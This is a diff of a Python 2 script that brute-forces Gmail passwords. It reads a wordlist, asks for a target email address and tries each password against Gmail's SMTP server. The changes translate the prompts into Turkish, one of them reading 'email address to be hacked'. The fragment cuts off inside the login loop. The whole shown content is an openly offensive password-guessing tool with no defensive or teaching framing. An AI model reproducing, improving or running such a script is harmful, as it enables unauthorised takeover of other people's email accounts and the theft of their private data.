@@ -7,11 +7,11 @@ from os import system
 def main():
    print '================================================='
 main()
-print '[1] hcked @gmail'
+print '[1] Gmail'
 print '[2] exit'
 option = input('==>')
 if option == 1:
-   file_path = raw_input('path of passwords file :')
+   file_path = raw_input('WordList Yolu:')
 else:
    system('clear')
    exit()
@@ -19,7 +19,7 @@ pass_file = open(file_path,'r')
 pass_list = pass_file.readlines()
 def login():
     i = 0
-    user_name = raw_input('target email :')
+    user_name = raw_input('Hacklenecek E-Mail Adresi :')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
     for password in pass_list:
